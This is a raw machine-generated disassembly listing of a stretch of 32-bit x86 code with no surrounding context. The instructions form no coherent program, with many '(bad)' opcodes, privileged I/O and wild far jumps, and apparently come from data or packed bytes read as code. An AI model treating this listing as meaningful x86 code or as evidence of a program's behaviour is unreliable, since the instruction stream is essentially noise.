  404a19:	bnd jl 0x404a51
  404a1c:	mov    ch,BYTE PTR [esi]
  404a1e:	or     esp,DWORD PTR [ecx+0x2e97feb3]
  404a24:	mul    DWORD PTR [edi+ecx*8+0xb]
  404a28:	cli    
  404a29:	push   ebp
  404a2a:	sub    DWORD PTR [edi],0x2138aab2
  404a30:	xor    edx,ebx
  404a32:	stos   BYTE PTR es:[di],al
  404a34:	int3   
  404a35:	rcr    DWORD PTR [ebp-0x2f2a3983],cl
  404a3b:	pop    esp
  404a3c:	retf   
  404a3d:	retf   
  404a3e:	mov    edi,?
  404a40:	leave  
  404a41:	aas    
  404a42:	test   eax,0x8659e32f
  404a47:	out    0xa9,al
  404a49:	jmp    0x404aa6
  404a4b:	mov    edx,0xaa2c85e4
  404a50:	icebp  
  404a51:	mov    bh,0x88
  404a53:	cmp    eax,0x2ee963c6
  404a58:	ds in  eax,dx
  404a5a:	and    eax,0x4b
  404a5d:	jmp    0x404a7f
  404a5f:	call   0x6868:0x5f8d38d8
  404a66:	push   es
  404a67:	inc    edx
  404a68:	adc    BYTE PTR [eax],ah
  404a6a:	(bad)  
  404a6b:	ja     0x404aa2
  404a6d:	and    eax,0xcece0cdf
  404a72:	loope  0x404a04
  404a74:	mov    edi,0x8411dea8
  404a79:	pop    ebx
  404a7a:	rcr    DWORD PTR [edi],1
  404a7c:	mov    ebp,ebp
  404a7e:	cmp    DWORD PTR [edx-0x68791029],ecx
  404a84:	enter  0x5420,0x59
  404a88:	jae    0x404a52
  404a8a:	scas   eax,DWORD PTR es:[edi]
  404a8b:	andps  xmm6,XMMWORD PTR [ebp-0x4e6cf8d5]
  404a92:	lods   eax,DWORD PTR ds:[esi]
  404a93:	jp     0x404b0a
  404a95:	mov    bh,0x33
  404a97:	rcl    DWORD PTR [edx-0x7b709e8a],0xad
  404a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9f:	outs   dx,BYTE PTR ds:[esi]
  404aa0:	jg     0x404b1f
  404aa2:	mov    ebx,0x661903e1
  404aa7:	mov    cl,0x55
  404aa9:	in     eax,0xcd
  404aab:	mov    eax,ds:0x677408cf
  404ab0:	arpl   WORD PTR [ecx+0x558bc29d],cx
  404ab6:	jp     0x404a7f
  404ab8:	cmp    bh,BYTE PTR [ecx-0x5ed6d80d]
  404abe:	iret   
  404abf:	or     edi,DWORD PTR [edx+eiz*4]
  404ac2:	retf   0x3d01
  404ac5:	jmp    0xa880:0x82a7fd7a
  404acc:	and    BYTE PTR [eax+0x742d1f82],cl
  404ad2:	add    ecx,DWORD PTR [edx]
  404ad4:	add    eax,0x6953c168
  404ad9:	lea    ebp,[ecx+0x64559724]
  404adf:	fnstcw WORD PTR [edx+eax*8-0x4b]
  404ae3:	dec    ecx
  404ae4:	mov    ebp,DWORD PTR [eax+0x4b9d8394]
  404aea:	out    0xb,al
  404aec:	aad    0xf0
  404aee:	fcomip st,st(0)
  404af0:	adc    edi,DWORD PTR [ecx-0x3496afa5]
  404af6:	addr16 retf 0xb358
  404afa:	push   esi
  404afb:	pop    ds
  404afc:	loopne 0x404ac4
  404afe:	outs   dx,BYTE PTR ds:[esi]
  404aff:	icebp  
  404b00:	std    
  404b01:	cmp    dh,BYTE PTR [ecx]
  404b03:	jge    0x404b3a
  404b05:	mov    ch,0xf4
  404b07:	outs   dx,BYTE PTR ds:[esi]
  404b08:	adc    eax,0xa9b94e8a
  404b0d:	cmp    al,0x3c
  404b0f:	scas   al,BYTE PTR es:[edi]
  404b10:	into   
  404b11:	mov    bh,0x96
  404b13:	xor    esp,esp
  404b15:	repz icebp 
  404b17:	xor    DWORD PTR [eax],edi
  404b19:	(bad)  
  404b1a:	ficomp DWORD PTR [eax-0x7c]
  404b1d:	outs   dx,DWORD PTR ds:[esi]
  404b1e:	scas   eax,DWORD PTR es:[edi]
  404b1f:	xchg   DWORD PTR [eax-0x42],eax
  404b22:	iret   
  404b23:	neg    DWORD PTR [eax+0x76]
  404b26:	push   esp
  404b27:	lahf   
  404b28:	xchg   ecx,eax
  404b29:	pop    esp
  404b2a:	mov    al,ds:0xe832534d
  404b2f:	mov    dl,BYTE PTR [edx-0x1b32e862]
  404b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b36:	jmp    0x8af0:0xd25863cb
  404b3d:	jecxz  0x404ad7
  404b3f:	imul   ebx,DWORD PTR [ebx],0x93e2bf4f
  404b45:	adc    eax,0x7ab0e86e
  404b4a:	int    0x87
  404b4c:	cmovae ebp,DWORD PTR [ebp-0x42a4d11b]
  404b53:	mov    cl,0x95
  404b55:	fcom   QWORD PTR [edi+0x38]
  404b58:	xor    ebp,DWORD PTR [eax]
  404b5a:	pop    ss
  404b5b:	push   ebx
  404b5c:	xchg   esi,eax
  404b5d:	loopne 0x404bc2
  404b5f:	sbb    esi,DWORD PTR [ebx+0x37]
  404b62:	in     al,dx
  404b63:	retf   0xa921
  404b66:	adc    BYTE PTR [ebp-0x37],0xc2
  404b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6b:	adc    ch,BYTE PTR [edi-0x5f]
  404b6e:	in     eax,0xaf
  404b70:	out    dx,eax
  404b71:	jmp    edi
  404b73:	les    ecx,FWORD PTR [esi]
  404b75:	int    0x42
  404b77:	loope  0x404b53
  404b79:	gs xchg esi,eax
  404b7b:	call   0xa17d:0xa6c546d9
  404b82:	mov    esi,0x3d5d8685
  404b87:	xor    BYTE PTR [edi+eiz*1+0x24c32049],ch
  404b8e:	and    DWORD PTR [edi+0x4e74831f],esi
  404b94:	mov    DWORD PTR [edx-0x1235eecb],esp
  404b9a:	push   ds
  404b9b:	xor    eax,0xd66d2184
  404ba0:	adc    ebp,ecx
  404ba2:	mov    esi,0x113e7e65
  404ba7:	fcom   DWORD PTR [eax+ecx*4+0xc]
  404bab:	jle    0x404c1b
  404bad:	push   0x339842f
  404bb2:	(bad)  
  404bb3:	push   esi
  404bb4:	fldenv [eax-0x44bd3430]
  404bba:	sbb    ecx,DWORD PTR [edi]
  404bbc:	pop    ds
  404bbd:	cdq    
  404bbe:	sbb    BYTE PTR [edi],cl
  404bc0:	jae    0x404bed
  404bc2:	sbb    eax,0xf62d82ac
  404bc7:	and    ebx,DWORD PTR [edx+0x33]
  404bca:	not    DWORD PTR [edi+eax*4+0x34b33742]
  404bd1:	mov    ebp,0xade04b40
  404bd6:	mov    esi,0x6d4fbf93
  404bdb:	pop    esi
  404bdc:	xor    eax,0x228d9a79
  404be1:	cli    
  404be2:	mov    dh,0x1
  404be4:	inc    edi
  404be5:	leave  
  404be6:	pop    eax
  404be7:	inc    ecx
  404be8:	push   ds
  404be9:	ja     0x404c4d
  404beb:	fcomp  QWORD PTR [eax+ebp*8]
  404bee:	jnp    0x404c42
  404bf0:	call   0xbcf74984
  404bf5:	mov    bh,0xcb
  404bf7:	repnz push 0x7eec8069
  404bfd:	fs into 
  404bff:	cs pusha 
  404c01:	shl    DWORD PTR [edx+0x19ef0349],0xc2
  404c08:	hlt    
  404c09:	mov    edi,0x78318728
  404c0e:	sub    ecx,eax
  404c10:	push   edx
  404c11:	imul   edx,DWORD PTR [ebp-0x1d],0x249f2259
  404c18:	xchg   DWORD PTR [ebp-0x7e],ebx
  404c1b:	iret   
  404c1c:	cmp    ch,BYTE PTR [esp+edx*4+0x6314ea08]
  404c23:	dec    eax
  404c24:	mov    WORD PTR [esi-0x34fa0a70],ds
  404c2a:	mov    bh,0x4f
  404c2c:	mov    dl,0x27
  404c2e:	fst    QWORD PTR [ebp+0xb]
  404c31:	les    esi,FWORD PTR [edx]
  404c33:	add    al,0x86
  404c35:	retf   
  404c36:	mov    ebx,0x6b3a2af
  404c3b:	cmp    esp,esi
  404c3d:	(bad)  
  404c3e:	js     0x404c2e
  404c40:	add    esi,DWORD PTR [ebx]
  404c42:	pop    esp
  404c43:	test   DWORD PTR [ebx-0x3d65aaf3],ecx
  404c49:	test   eax,0x914944fa
  404c4e:	xchg   ch,bl
  404c50:	inc    BYTE PTR [edi+0x3]
  404c53:	stos   DWORD PTR es:[edi],eax
  404c54:	js     0x404bea
  404c56:	xor    ecx,DWORD PTR [esi-0x3f]
  404c59:	and    ah,ah
  404c5b:	out    dx,eax
  404c5c:	clc    
  404c5d:	pop    esi
  404c5e:	fcmovnb st,st(1)
  404c60:	push   es
  404c61:	xlat   BYTE PTR ds:[ebx]
  404c62:	xchg   ebp,eax
  404c63:	rcr    DWORD PTR [edi*8+0x4cdeee8],0x9
  404c6b:	sbb    edi,edi
  404c6d:	sbb    al,0x76
  404c6f:	mov    al,ds:0x1954b81f
  404c74:	and    BYTE PTR [ebx],cl
  404c76:	aas    
  404c77:	pusha  
  404c78:	stc    
  404c79:	xchg   edi,eax
  404c7a:	xchg   ebx,eax
  404c7b:	js     0x404cea
  404c7d:	adc    eax,0xcfc48858
  404c82:	xchg   ebp,esi
  404c84:	inc    ecx
  404c85:	lea    ebx,[edi]
  404c87:	int    0x7f
  404c89:	mov    ebp,0x5d142df2
  404c8e:	rol    BYTE PTR [esi+0x24],cl
  404c91:	(bad)  
  404c92:	jle    0x404c38
  404c94:	inc    ebx
  404c95:	fnstcw WORD PTR [ecx+ebp*4]
  404c98:	mov    eax,ds:0x7e8faf9b
  404c9d:	jge    0x404caf
  404c9f:	and    edx,DWORD PTR [ecx+edx*8]
  404ca2:	dec    esp
  404ca3:	and    al,0x5
  404ca5:	xlat   BYTE PTR ds:[ebx]
  404ca6:	add    BYTE PTR [ebp-0x2d6079ab],al
  404cac:	jbe    0x404c8e
  404cae:	aam    0x36
  404cb0:	xchg   ebp,eax
  404cb1:	mov    cl,BYTE PTR [edi+0x58b30115]
  404cb7:	rol    cl,cl
  404cb9:	cmp    DWORD PTR [edx],edx
  404cbb:	cmp    al,0x7d
  404cbd:	cmp    BYTE PTR [eax-0x3c],dl
  404cc0:	xchg   BYTE PTR [eax],bl
  404cc2:	ret    0x8223
  404cc5:	add    eax,0x3150b746
  404cca:	repz fsubr DWORD PTR [esi]
  404ccd:	and    eax,0x24bd5cb1
  404cd2:	pop    es
  404cd3:	push   ebx
  404cd4:	jp     0x404cb7
  404cd6:	and    ecx,DWORD PTR [edi+0x36]
  404cd9:	add    al,0x96
  404cdb:	inc    edi
  404cdc:	retf   
  404cdd:	adc    BYTE PTR [ebx+0x759f60dd],ah
  404ce3:	nop
  404ce4:	test   DWORD PTR [ecx+edi*1+0x4213de64],esp
  404ceb:	ss jmp 0x25ac9d34
  404cf1:	xchg   ecx,eax
  404cf2:	and    eax,0x4ac34d7b
  404cf7:	data16 fnstsw WORD PTR [ebx-0x733d9e0f]
  404cfe:	sar    BYTE PTR [edi],1
  404d00:	(bad)  [ebx+0x36]
  404d03:	jge    0x404cd7
  404d05:	fistp  QWORD PTR [edi-0x26fbd1dd]
  404d0b:	xchg   esi,eax
  404d0c:	jle    0x404c94
  404d0e:	dec    edi
  404d0f:	cmp    edx,DWORD PTR [eax-0x32]
  404d12:	push   0xb6d5a57e
  404d17:	mov    ds:0xec687373,eax
  404d1c:	mov    ds,WORD PTR ds:0xafb75e4a
  404d22:	or     dl,BYTE PTR [esi-0x61]
  404d25:	xor    al,0x34
  404d27:	clc    
  404d28:	imul   ebx,ebp,0x170c4871
  404d2e:	inc    esi
  404d2f:	fisubr WORD PTR ds:0x7ea55e86
  404d35:	mov    bh,0x19
  404d37:	iret   
  404d38:	out    0x2d,eax
  404d3a:	add    si,WORD PTR [edx+0x15f1249f]
  404d41:	mov    bh,0x1c
  404d43:	cld    
  404d44:	fwait
  404d45:	xlat   BYTE PTR ds:[ebx]
  404d46:	push   esp
  404d47:	add    DWORD PTR [ebx+0x4176541a],edi
  404d4d:	jnp    0x404d0c
  404d4f:	out    dx,al
  404d50:	mov    eax,0x68d37740
  404d55:	fld    DWORD PTR [ecx]
  404d57:	rcr    bh,cl
  404d59:	xor    DWORD PTR [esi-0x5f6174fc],eax
  404d5f:	mov    ecx,DWORD PTR [edx-0x34afaa38]
  404d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d66:	mov    bl,0x2c
  404d68:	jmp    0x404d75
  404d6a:	push   eax
  404d6b:	addr16 pop esi
  404d6d:	and    eax,0x49cb04e4
  404d72:	jp     0x404d54
  404d74:	nop
  404d75:	mov    ah,dl
  404d77:	cli    
  404d78:	gs nop
  404d7a:	push   eax
  404d7b:	jae    0x404de3
  404d7d:	mov    edi,0x6f73737e
  404d82:	(bad)  
  404d83:	in     al,dx
  404d84:	fnstsw WORD PTR [ebx-0x7068e0f8]
  404d8a:	add    ecx,DWORD PTR [eax+ecx*8]
  404d8d:	cmp    BYTE PTR [esi],al
  404d8f:	sub    ebx,DWORD PTR [ecx+0x7dd2403d]
  404d95:	dec    edx
  404d96:	xor    dl,BYTE PTR [ecx+0x28]
  404d99:	jns    0x404d79
  404d9b:	mov    ecx,0x24db87ca
  404da0:	adc    BYTE PTR [ebp-0x6398344e],ch
  404da6:	push   eax
  404da7:	sub    ah,BYTE PTR [esi]
  404da9:	imul   esp,DWORD PTR [ebp+0x785370a2],0xfffffffa
  404db0:	call   0x8e3d52bc
  404db5:	addr16 out dx,al
  404db7:	in     al,0x80
  404db9:	inc    ecx
  404dba:	sbb    BYTE PTR [ebp+0x7064c2ba],0xaa
  404dc1:	sub    al,0x74
  404dc3:	sub    eax,0x7486e88a
  404dc8:	push   edx
  404dc9:	sub    BYTE PTR [edi],0xca
  404dcc:	jmp    0x1db9976e
  404dd1:	add    al,0x5e
  404dd3:	fcomp  DWORD PTR [esi+0x307c732b]
  404dd9:	mov    eax,0xcdc36506
  404dde:	push   0x7dab52d4
  404de3:	sbb    ebx,edi
  404de5:	sbb    DWORD PTR [ebp-0x12],0x76
  404de9:	mov    DWORD PTR [edx],ecx
  404deb:	adc    ch,al
  404ded:	stos   DWORD PTR es:[edi],eax
  404dee:	aad    0x68
  404df0:	adc    eax,0x7dd81267
  404df5:	pop    esi
  404df6:	cmc    
  404df7:	fsub   QWORD PTR ds:0x14c2984d
  404dfd:	fcomp  DWORD PTR [esi-0x2]
  404e00:	add    al,0xef
  404e02:	inc    eax
  404e03:	test   DWORD PTR [ebx],esp
  404e05:	xchg   ecx,eax
  404e06:	bound  ecx,QWORD PTR [ebx+0x55]
  404e09:	sub    al,0x46
  404e0b:	mov    ch,0x79
  404e0d:	add    edx,edi
  404e0f:	sbb    al,0xa6
  404e11:	imul   ebx,DWORD PTR [ebx+0x3b],0x646e4ed
  404e18:	jne    0x404df4
  404e1a:	jmp    0xb3395be9
  404e1f:	xchg   esi,eax
  404e20:	rol    DWORD PTR [esi+0x7c],0x15
  404e24:	imul   esp,DWORD PTR [ebp+0x58],0x625082df
  404e2b:	ret    
  404e2c:	xchg   ebp,eax
  404e2d:	lahf   
  404e2e:	lods   eax,DWORD PTR ds:[esi]
  404e2f:	pop    edx
  404e30:	inc    eax
  404e31:	jmp    0x404e9b
  404e33:	add    al,0xf7
  404e35:	daa    
  404e36:	(bad)  
  404e37:	xchg   edx,eax
  404e38:	(bad)  
  404e39:	sar    DWORD PTR ds:0x499288ff,1
  404e3f:	xchg   esi,eax
  404e40:	xchg   ebp,eax
  404e41:	mov    al,0x89
  404e43:	jne    0x404dd6
  404e45:	loope  0x404ea2
  404e47:	fisttp DWORD PTR [eax-0x3a]
  404e4a:	add    DWORD PTR [ecx+0x53],ebp
  404e4d:	jne    0x404df5
  404e4f:	inc    ebp
  404e50:	jmp    0x997b:0x9df4e2ce
  404e57:	sub    ecx,esp
  404e59:	dec    edx
  404e5a:	cmp    eax,eax
  404e5c:	fsubp  st(6),st
  404e5e:	(bad)
  404e62:	add    eax,0x17eb01ea
  404e67:	pop    es
  404e68:	out    dx,eax
  404e69:	repz push ds
  404e6b:	and    DWORD PTR [eax],0xffffffd7
  404e6e:	push   esi
  404e6f:	mov    ch,0x47
  404e71:	les    ecx,FWORD PTR [esi+0x32ebcab7]
  404e77:	pop    esp
  404e78:	addr16 es loopne 0x404edc
  404e7c:	scas   eax,DWORD PTR es:[edi]
  404e7d:	adc    cl,dl
  404e7f:	lock cld 
  404e81:	je     0x404ed4
  404e83:	das    
  404e84:	mov    esi,0x3ed757b4
  404e89:	dec    esp
  404e8a:	push   ecx
  404e8b:	xchg   ebx,eax
  404e8c:	mov    eax,ds:0xc45eb349
  404e91:	shl    BYTE PTR [ebx+ecx*4+0x63f43d30],cl
  404e98:	mov    al,ds:0xfd7e784c
  404e9d:	(bad)  
  404e9e:	or     esi,DWORD PTR [edx-0x39d0c659]
  404ea4:	inc    ebp
  404ea5:	or     ebx,ebx
  404ea7:	ror    BYTE PTR [eax-0x2451a006],1
  404ead:	daa    
  404eae:	daa    
  404eaf:	dec    esp
  404eb0:	pushf  
  404eb1:	sub    DWORD PTR [ebp-0x516d9867],esp
  404eb7:	adc    eax,0x1e2c6e9
  404ebc:	xchg   edi,eax
  404ebd:	fistp  DWORD PTR [ecx+0x67]
  404ec0:	fs sub al,0xa2
  404ec3:	loopne 0x404eaa
  404ec5:	add    cl,bh
  404ec7:	lahf   
  404ec8:	in     eax,dx
  404ec9:	das    
  404eca:	lds    ebp,FWORD PTR [esi]
  404ecc:	(bad)  
  404ecd:	dec    ebx
  404ece:	mov    al,dl
  404ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ed1:	lahf   
  404ed2:	mov    dh,0x81
  404ed4:	jb     0x404ec9
  404ed6:	xchg   cl,dl
  404ed8:	repz not eax
  404edb:	mov    ebx,0x8c4ee080
  404ee0:	sub    edx,edx
  404ee2:	jge    0x404e68
  404ee4:	mov    bl,0xf5
  404ee6:	push   ecx
  404ee7:	and    BYTE PTR [ebp+eax*2-0x73],cl
  404eeb:	and    ch,BYTE PTR [edx]
  404eed:	arpl   WORD PTR [ebx*4-0x77b9a433],bx
  404ef4:	dec    edi
  404ef5:	mov    ebp,ebp
  404ef7:	test   BYTE PTR [ebp-0x2a989f1c],al
  404efd:	pop    ds
  404efe:	and    ecx,ebx
  404f00:	xor    DWORD PTR [esi+edx*4-0x61a3c518],esi
  404f07:	fsub   QWORD PTR [ebx-0x49]
  404f0a:	pop    esp
  404f0b:	mov    cs,ebp
  404f0d:	js     0x404f61
  404f0f:	loop   0x404f79
  404f11:	add    DWORD PTR [ebp-0x65],esi
  404f14:	mov    ebx,0xc9d91f2f
  404f19:	pop    ds
  404f1a:	or     al,0xe7
  404f1c:	pop    edi
  404f1d:	aaa    
  404f1e:	or     DWORD PTR [edx],eax
  404f20:	sahf   
  404f21:	pop    edi
  404f22:	xchg   DWORD PTR [esi+0x72f7348a],edi
  404f28:	push   esi
  404f29:	cs sti 
  404f2b:	(bad)  
  404f2c:	mov    edi,DWORD PTR [ecx]
  404f2e:	mov    eax,ds:0x35ae2f19
  404f33:	and    DWORD PTR ds:0xa0ae5862,ecx
  404f39:	push   cs
  404f3a:	loopne 0x404f7b
  404f3c:	ja     0x404f7d
  404f3e:	and    ecx,ebx
  404f40:	mov    al,ds:0xa4560b9f
  404f45:	jb     0x404fab
  404f47:	scas   al,BYTE PTR es:[edi]
  404f48:	or     edi,edx
  404f4a:	adc    esp,DWORD PTR [esi]
  404f4c:	adc    ecx,DWORD PTR [ebp+0x0]
  404f4f:	mov    ds,ebx
  404f51:	daa    
  404f52:	xchg   ecx,eax
  404f53:	add    DWORD PTR [ebp+ebx*2-0x1f],0xffffffc2
  404f58:	xor    ecx,DWORD PTR [ebp-0x7e]
  404f5b:	jg     0x404f92
  404f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5e:	adc    ebp,DWORD PTR [edi-0x40]
  404f61:	dec    eax
  404f62:	iret   
  404f63:	mov    al,ds:0x7755d941
  404f68:	mov    cs,WORD PTR [eax+0x6cb74719]
  404f6e:	cmp    edx,DWORD PTR [esi+0x257434d6]
  404f74:	push   cs
  404f75:	mov    ah,0x81
  404f77:	jno    0x404f86
  404f79:	dec    esi
  404f7a:	jp     0x404fa0
  404f7c:	mov    ebp,0x17290f0e
  404f81:	lock hlt 
  404f83:	aad    0x98
  404f85:	les    edi,FWORD PTR [ebx-0x1b54cf82]
  404f8b:	shr    DWORD PTR [ebp+0x5c168145],cl
  404f91:	sub    BYTE PTR [ecx-0x57],bl
  404f94:	pop    ds
  404f95:	cs adc dh,dh
  404f98:	sub    bl,BYTE PTR [eax+0x6e56f2f2]
  404f9e:	cli    
  404f9f:	sbb    DWORD PTR [eax+0x8c63171],ebp
  404fa5:	push   es
  404fa6:	push   ds
  404fa7:	xor    DWORD PTR [ecx+0x1],ebx
  404faa:	shl    al,0x69
  404fad:	out    0x9c,eax
  404faf:	sbb    al,0xb0
  404fb1:	(bad)  
  404fb3:	shl    BYTE PTR [esp+edi*4-0x23718aaf],0xbb
  404fbb:	(bad)  
  404fbd:	les    edi,FWORD PTR [esi-0x47]
  404fc0:	dec    ecx
  404fc1:	pusha  
  404fc2:	(bad)  
  404fc3:	adc    eax,0x501d1890
  404fc8:	sbb    al,ah
  404fca:	inc    edx
  404fcb:	cli    
  404fcc:	xchg   ch,ch
  404fce:	push   esi
  404fcf:	daa    
  404fd0:	shl    BYTE PTR [edx],0x6e
  404fd3:	rcl    DWORD PTR [ecx-0x3b064459],0x4d
  404fda:	jbe    0x405028
  404fdc:	inc    eax
  404fdd:	(bad)  
  404fde:	fdiv   DWORD PTR [eax]
  404fe0:	mov    dh,0xaa
  404fe2:	xor    ecx,esp
  404fe4:	pop    es
  404fe5:	mov    bh,0xc0
  404fe7:	jmp    0x404fea
  404fe9:	pop    ecx
  404fea:	stos   DWORD PTR es:[edi],eax
  404feb:	mov    bh,0xc2
  404fed:	sbb    ecx,eax
  404fef:	xor    eax,0x6c84c2b7
  404ff4:	in     eax,0x3f
  404ff6:	sbb    dl,BYTE PTR [esi+0x26cd609c]
  404ffc:	xor    al,0xfe
  404ffe:	mov    BYTE PTR es:[edx+0x0],cl
  405002:	out    dx,eax
  405003:	pushf  
  405004:	pop    ebx
  405005:	imul   eax,ebx,0x6024411b
  40500b:	pop    esi
  40500c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500e:	cwde   
  40500f:	mov    al,0x80
  405011:	push   eax
  405012:	xor    DWORD PTR [eax-0x38],esi
  405015:	dec    ebx
  405016:	inc    esi
  405017:	mov    ds:0x3d9c80a3,al
  40501c:	icebp  
  40501d:	cdq    
  40501e:	jle    0x405052
  405020:	out    0x95,eax
  405022:	loopne 0x405012
  405024:	xor    ecx,DWORD PTR [ecx-0x64]
  405027:	pusha  
  405028:	sbb    bh,BYTE PTR [ebp-0x5c0bb833]
  40502e:	sbb    eax,DWORD PTR ds:0xc09170a0
  405034:	and    ch,cl
  405036:	addr16 jmp 0xc8f4bac3
  40503c:	sbb    eax,esi
  40503e:	test   BYTE PTR [ecx],bh
  405040:	les    edx,FWORD PTR [edx-0x44]
  405043:	push   eax
  405044:	loop   0x40508c
  405046:	(bad)  
  405047:	sub    ebx,DWORD PTR [eax]
  405049:	cmc    
  40504a:	pop    es
  40504b:	stos   DWORD PTR es:[edi],eax
  40504c:	cmp    edi,DWORD PTR ds:0x92dc747c
  405052:	pushf  
  405053:	pop    ss
  405054:	repnz pop es
  405056:	sub    ebp,DWORD PTR [edi-0x6f]
  405059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40505a:	ja     0x405029
  40505c:	jp     0x405052
  40505e:	lea    edi,[ebx]
  405060:	ret    0x26f3
  405063:	sbb    ecx,DWORD PTR [ecx+0x36]
  405066:	cmp    eax,0x6e5cd3
  40506b:	xor    DWORD PTR [edi+0x56172a60],ecx
  405071:	push   esi
  405072:	mov    ss,WORD PTR [edx+0xe]
  405075:	clc    
  405076:	mov    BYTE PTR [ebp-0x6f],ah
  405079:	jp     0x4050b5
  40507b:	loopne 0x405040
  40507d:	mov    edx,0x63c577ea
  405082:	jge    0x4050b2
  405084:	mov    ebx,0x44a5f20a
  405089:	in     eax,dx
  40508a:	ret    0xa5db
  40508d:	test   eax,0xea7ad1e4
  405092:	and    BYTE PTR [esp+edi*8-0x53],bh
  405096:	xchg   ah,cl
  405098:	push   esp
  405099:	scas   eax,DWORD PTR es:[edi]
  40509a:	sbb    al,0x73
  40509c:	out    dx,eax
  40509d:	jno    0x4050eb
  40509f:	xor    BYTE PTR [esi+0x6e57ba95],bh
  4050a5:	stos   DWORD PTR es:[edi],eax
  4050a6:	cmc    
  4050a7:	ins    DWORD PTR es:[edi],dx
  4050a8:	push   0x45
  4050aa:	xchg   edx,eax
  4050ab:	(bad)  
  4050ac:	ret    0xcdf5
  4050af:	sub    eax,0xa149f237
  4050b4:	dec    ebp
  4050b5:	sub    DWORD PTR [edx+0x38],edi
  4050b8:	into   
  4050b9:	mov    dh,0xcd
  4050bb:	pop    esp
  4050bc:	mov    dl,0x30
  4050be:	push   eax
  4050bf:	rcr    DWORD PTR [ebx-0x6c18e33],cl
  4050c5:	adc    eax,DWORD PTR [esi]
  4050c7:	mov    esi,0x7ce5a731
  4050cc:	or     eax,0x552028ca
  4050d1:	mov    ebx,0x26b214ea
  4050d6:	jb     0x405109
  4050d8:	cdq    
  4050d9:	sar    BYTE PTR ds:0xce215502,cl
  4050df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050e0:	hlt    
  4050e1:	pop    eax
  4050e2:	ror    DWORD PTR [ebp+0x3b8873d0],1
  4050e8:	jne    0x4050f2
  4050ea:	stc    
  4050eb:	add    DWORD PTR [ebx-0x5b],ebp
  4050ee:	jecxz  0x405090
  4050f0:	sbb    eax,0xfa724523
  4050f5:	xlat   BYTE PTR ds:[ebx]
  4050f6:	cmc    
  4050f7:	mov    eax,ds:0x2ced60b6
  4050fc:	cs loop 0x4050c1
  4050ff:	mov    bh,0xea
  405101:	sahf   
  405102:	push   es
  405103:	and    eax,0xb015cdad
  405108:	int    0x61
  40510a:	push   eax
  40510c:	jae    0x405159
  40510e:	pop    esi
  40510f:	or     ebx,DWORD PTR [ecx+0x6a4def19]
  405115:	addr16 ds cwde 
  405118:	or     dl,BYTE PTR [esi+edx*4]
  40511b:	test   BYTE PTR [ebx+eiz*2+0x1425d3be],al
  405122:	xchg   edi,eax
  405123:	xchg   ebx,eax
  405124:	sbb    DWORD PTR [edx],eax
  405126:	shl    BYTE PTR [eax],1
  405128:	inc    edx
  405129:	push   cs
  40512a:	sbb    bh,cl
  40512c:	scas   eax,DWORD PTR es:[edi]
  40512d:	jge    0x4050d6
  40512f:	mov    esp,0x5edc16da
  405134:	add    edx,ebp
  405136:	adc    dh,0x45
  405139:	push   ss
  40513a:	push   edi
  40513b:	pop    esp
  40513c:	aad    0x72
  40513e:	bound  edi,QWORD PTR [esp+esi*1]
  405141:	xchg   ebp,eax
  405142:	cmp    ah,BYTE PTR [esi]
  405144:	lods   eax,DWORD PTR ds:[esi]
  405145:	repnz xchg esp,eax
  405147:	ins    DWORD PTR es:[edi],dx
  405148:	push   edi
  405149:	mov    ebp,0xa8e7a21
  40514e:	(bad)  
  40514f:	bound  ebp,QWORD PTR [ecx+0x5e8db41d]
  405155:	cmp    ch,BYTE PTR [esi+0x5b]
  405158:	mov    ah,BYTE PTR [edi]
  40515a:	push   esp
  40515b:	xor    BYTE PTR [ebp-0x46],bh
  40515e:	inc    edx
  40515f:	lods   eax,DWORD PTR ds:[esi]
  405160:	xor    DWORD PTR [ecx-0x55a59b6f],edx
  405166:	jae    0x4051b8
  405168:	xor    DWORD PTR [edx],edi
  40516a:	shr    DWORD PTR [ebx],0x5f
  40516d:	mov    bl,0x9a
  40516f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405170:	mov    ch,0xf6
  405172:	mov    dl,0x17
  405174:	hlt    
  405175:	scas   al,BYTE PTR es:[edi]
  405176:	sbb    BYTE PTR [ebp+0x21],bh
  405179:	adc    ch,BYTE PTR [edi+0x675ce318]
  40517f:	arpl   sp,dx
  405181:	lds    edi,FWORD PTR ds:0xd50f5bb2
  405187:	or     BYTE PTR [edi],ch
  405189:	rcr    DWORD PTR [esi],1
  40518b:	mov    al,ds:0xbdbd4539
  405190:	data16 (bad) 
  405192:	nop
  405193:	retf   
  405194:	sub    bh,bh
  405196:	fcom   DWORD PTR [ebx-0x18]
  405199:	sbb    DWORD PTR ds:0xd2ddddf5,esp
  40519f:	xchg   ebp,eax
  4051a0:	fwait
  4051a1:	out    0xd1,eax
  4051a3:	outs   dx,DWORD PTR ds:[esi]
  4051a4:	add    BYTE PTR [ecx],0xfe
  4051a7:	ror    DWORD PTR [eax],0x74
  4051aa:	lods   eax,DWORD PTR ds:[esi]
  4051ab:	aas    
  4051ac:	adc    bh,0x9
  4051af:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4051b1:	enter  0x2a62,0xbe
  4051b5:	mov    WORD PTR [edx],ss
  4051b7:	ja     0x40520b
  4051b9:	retf   
  4051ba:	jp     0x40523b
  4051bc:	mov    al,0x36
  4051be:	xchg   esp,eax
  4051bf:	lods   al,BYTE PTR ds:[esi]
  4051c0:	(bad)  
  4051c1:	sar    DWORD PTR [ebx-0x3b],1
  4051c4:	imul   ebp,DWORD PTR [ebp+0x28],0x11
  4051c8:	int    0xa7
  4051ca:	cdq    
  4051cb:	push   edi
  4051cc:	adc    eax,0x96934931
  4051d1:	pop    edx
  4051d2:	jp     0x4051fa
  4051d4:	add    cl,BYTE PTR [esp+edx*8+0x65]
  4051d8:	sti    
  4051d9:	lock mov ds:0x651bfdd4,al
  4051df:	and    dh,BYTE PTR [edi+eiz*1-0x73899e38]
  4051e6:	adc    BYTE PTR [edi-0x72771458],dh
  4051ec:	ficomp WORD PTR [ecx-0x1a6bef22]
